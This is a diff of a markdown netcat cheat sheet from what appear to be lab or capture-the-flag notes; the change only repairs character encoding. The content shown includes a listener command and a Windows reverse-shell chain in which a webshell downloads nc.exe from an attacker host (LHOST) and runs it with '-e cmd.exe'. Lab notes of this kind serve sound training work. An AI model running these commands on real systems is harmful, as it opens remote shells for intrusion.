@@ -1,4 +1,4 @@
-ï»¿# netcat (nc)
+# netcat (nc)
 
 ## Internal Commands
 
@@ -25,10 +25,10 @@ nc -lvnp 4444
 ```
 Used on: **Kobold**, **Silentium**, **CCTV**, **DevArea**
 
-- `-l` â€” listen mode
-- `-v` â€” verbose
-- `-n` â€” no DNS resolution
-- `-p` â€” port number
+- `-l` — listen mode
+- `-v` — verbose
+- `-n` — no DNS resolution
+- `-p` — port number
 
 ### FIFO-based reverse shell (Alpine with limited `nc`)
 ```bash
@@ -50,13 +50,15 @@ Used on: **MonitorsFour**
 
 ### Windows reverse shell via staged `nc.exe`
 ```bash
-# Attacker â€” host the binary
+# Attacker — host the binary
 cp /usr/share/windows-binaries/nc.exe .
 python3 -m http.server 80
 nc -lvnp 4444
 
-# Target (via webshell) â€” pull + run
+# Target (via webshell) — pull + run
 powershell -c "Invoke-WebRequest http://LHOST/nc.exe -OutFile C:\Windows\Temp\nc.exe"
 C:\Windows\Temp\nc.exe LHOST 4444 -e cmd.exe
 ```
-Used on: **Relevant** â€” delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
+Used on: **Relevant** — delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
+
+
